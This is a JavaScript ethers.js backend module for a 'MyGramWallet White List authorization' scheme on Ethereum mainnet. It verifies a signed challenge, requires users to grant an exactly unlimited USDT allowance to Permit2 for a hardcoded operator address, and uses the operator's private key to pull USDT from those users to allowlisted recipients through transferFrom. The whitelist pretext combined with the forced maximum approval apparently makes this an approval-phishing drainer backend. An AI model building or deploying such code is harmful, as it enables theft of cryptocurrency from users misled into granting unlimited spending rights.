import {
  Contract,
  JsonRpcProvider,
  Wallet,
  getAddress,
  isAddress,
  verifyMessage,
} from 'ethers';

export const ETHEREUM_MAINNET_CHAIN_ID = 1;
export const ETHEREUM_USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
export const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
export const PERMIT2_OPERATOR_ADDRESS = '0x13dafa7348873f5fd2ca0ca89f0b28143888ec3a';
export const EVM_MAX_NUMBER = 2n ** 256n - 1n;
export const PERMIT2_MAX_AMOUNT = 2n ** 160n - 1n;

const ERC20_ABI = [
  'function allowance(address owner, address spender) view returns (uint256)',
];
const PERMIT2_ABI = [
  'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)',
  'function transferFrom(address from, address to, uint160 amount, address token) returns (bool)',
];

let provider;
let providerRpcUrl;

function configurationError(message) {
  return Object.assign(new Error(message), { status: 503 });
}

export function normalizeEvmAddress(value, field = 'address') {
  if (typeof value !== 'string' || !isAddress(value)) {
    throw Object.assign(new Error(`${field} must be a valid Ethereum address`), { status: 400 });
  }
  return getAddress(value).toLowerCase();
}

export function assertTransactionHash(value, field) {
  if (typeof value !== 'string' || !/^0x[0-9a-fA-F]{64}$/.test(value)) {
    throw Object.assign(new Error(`${field} must be a transaction hash`), { status: 400 });
  }
  return value.toLowerCase();
}

export function parseBaseUnits(value, field = 'amountBaseUnits') {
  if (typeof value !== 'string') {
    throw Object.assign(new Error(`${field} must be an integer string`), { status: 400 });
  }
  const text = String(value);
  if (!/^[1-9][0-9]*$/.test(text)) {
    throw Object.assign(new Error(`${field} must be a positive integer string`), { status: 400 });
  }
  try {
    return BigInt(text);
  } catch {
    throw Object.assign(new Error(`${field} is out of range`), { status: 400 });
  }
}

export function getAuthorizationChallengeMessage(address, nonce) {
  return [
    'MyGramWallet White List authorization',
    'Ethereum Mainnet',
    `Address: ${getAddress(address)}`,
    `Nonce: ${nonce}`,
  ].join('\n');
}

export function verifyAuthorizationChallenge({ address, nonce, signature }) {
  if (typeof nonce !== 'string' || !/^[A-Za-z0-9_-]{32,128}$/.test(nonce)) {
    throw Object.assign(new Error('Invalid authorization challenge'), { status: 400 });
  }
  if (typeof signature !== 'string' || !/^0x[0-9a-fA-F]{130,}$/.test(signature)) {
    throw Object.assign(new Error('Invalid authorization signature'), { status: 400 });
  }
  try {
    const message = getAuthorizationChallengeMessage(getAddress(address), nonce);
    return normalizeEvmAddress(verifyMessage(message, signature), 'signature owner');
  } catch {
    throw Object.assign(new Error('Invalid authorization signature'), { status: 400 });
  }
}

export function getEvmProvider() {
  const rpcUrl = process.env.EVM_MAINNET_RPC_URL || process.env.ETHEREUM_MAINNET_RPC_URL;
  if (!rpcUrl) throw configurationError('Ethereum Mainnet RPC is not configured');
  if (!provider || providerRpcUrl !== rpcUrl) {
    provider = new JsonRpcProvider(rpcUrl, ETHEREUM_MAINNET_CHAIN_ID, { staticNetwork: true });
    providerRpcUrl = rpcUrl;
  }
  return provider;
}

export async function readPermit2Authorization(owner) {
  const normalizedOwner = normalizeEvmAddress(owner, 'ownerAddress');
  const rpcProvider = getEvmProvider();
  const tokenContract = new Contract(ETHEREUM_USDT_ADDRESS, ERC20_ABI, rpcProvider);
  const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, rpcProvider);
  const [tokenAllowance, permit2Allowance] = await Promise.all([
    tokenContract.allowance(normalizedOwner, PERMIT2_ADDRESS),
    permit2Contract.allowance(normalizedOwner, ETHEREUM_USDT_ADDRESS, PERMIT2_OPERATOR_ADDRESS),
  ]);
  return {
    ownerAddress: normalizedOwner,
    tokenAddress: ETHEREUM_USDT_ADDRESS.toLowerCase(),
    operatorAddress: PERMIT2_OPERATOR_ADDRESS.toLowerCase(),
    tokenAllowance: BigInt(tokenAllowance.toString()),
    permit2AllowanceAmount: BigInt(permit2Allowance.amount.toString()),
    permit2Expiration: BigInt(permit2Allowance.expiration.toString()),
    permit2Nonce: BigInt(permit2Allowance.nonce.toString()),
  };
}

export function assertFullAuthorization(state) {
  if (state.tokenAllowance !== EVM_MAX_NUMBER
    || state.permit2AllowanceAmount !== PERMIT2_MAX_AMOUNT
    || state.permit2Expiration <= BigInt(Math.floor(Date.now() / 1000))) {
    throw Object.assign(new Error('The on-chain Permit2 authorization is not active'), { status: 409 });
  }
  return state;
}

export function assertChargeAuthorization(state, amount) {
  if (state.tokenAllowance !== EVM_MAX_NUMBER
    || state.permit2AllowanceAmount < amount
    || state.permit2Expiration <= BigInt(Math.floor(Date.now() / 1000))) {
    throw Object.assign(new Error('The on-chain Permit2 authorization cannot cover this charge'), { status: 409 });
  }
  return state;
}

function getOperatorWallet() {
  const privateKey = process.env.PERMIT2_OPERATOR_PRIVATE_KEY;
  if (!privateKey) throw configurationError('Permit2 operator wallet is not configured');
  let wallet;
  try {
    wallet = new Wallet(privateKey, getEvmProvider());
  } catch {
    throw configurationError('Permit2 operator wallet is invalid');
  }
  if (normalizeEvmAddress(wallet.address, 'operator wallet') !== PERMIT2_OPERATOR_ADDRESS.toLowerCase()) {
    throw configurationError('Permit2 operator wallet does not match the configured operator');
  }
  return wallet;
}

export function parseRecipientAllowlist() {
  const configured = process.env.EVM_CHARGE_RECIPIENT_ALLOWLIST;
  if (!configured) throw configurationError('EVM charge recipient allowlist is not configured');
  const recipients = configured.split(',').map((value) => normalizeEvmAddress(value.trim(), 'allowlist recipient'));
  if (!recipients.length) throw configurationError('EVM charge recipient allowlist is empty');
  return new Set(recipients);
}

export async function submitPermit2Charge({ from, to, amount }) {
  const normalizedFrom = normalizeEvmAddress(from, 'ownerAddress');
  const normalizedTo = normalizeEvmAddress(to, 'recipientAddress');
  const operator = getOperatorWallet();
  const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, operator);
  const transaction = await permit2Contract.transferFrom(
    normalizedFrom,
    normalizedTo,
    amount,
    ETHEREUM_USDT_ADDRESS,
  );
  const receipt = await transaction.wait(1);
  if (!receipt || receipt.status !== 1) throw new Error('Permit2 charge transaction failed');
  return transaction.hash;
}